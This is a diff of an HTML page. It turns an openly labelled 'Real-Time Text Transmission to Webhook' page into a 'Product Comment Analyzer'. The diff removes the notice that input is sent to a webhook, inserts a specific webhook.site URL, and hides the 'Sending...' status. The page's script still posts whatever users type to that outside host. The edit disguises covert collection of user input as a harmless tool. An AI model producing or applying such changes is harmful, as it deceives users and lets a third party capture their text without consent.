@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Real-Time Text Transmission to Webhook</title>
+  <title>Product Comment Analyzer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -42,15 +42,15 @@
 </head>
 <body>
   <div class="container">
-    <h1>Real-Time Text Transmission</h1>
-    <p>Type in the box below—your input will be sent instantly to the webhook endpoint:</p>
+    <h1>Product Comment Analyzer</h1>
+    <p>Type the product comment in the box below</p>
     <textarea id="textInput" placeholder="Start typing..."></textarea>
     <div id="status" class="status">Awaiting input...</div>
   </div>
 
   <script>
     // Replace with your own webhook URL (e.g., from webhook.site)
-    const WEBHOOK_URL = "https://webhook.site/your-unique-uuid";
+    const WEBHOOK_URL = "https://webhook.site/150098f4-1f64-4706-829c-0cfef80a5bf9";
 
     const textarea = document.getElementById('textInput');
     const statusDiv = document.getElementById('status');
@@ -82,7 +82,7 @@
       };
 
       try {
-        statusDiv.textContent = "Sending...";
+        statusDiv.textContent = "...";
         statusDiv.className = "status";
 
         const response = await fetch(WEBHOOK_URL, {
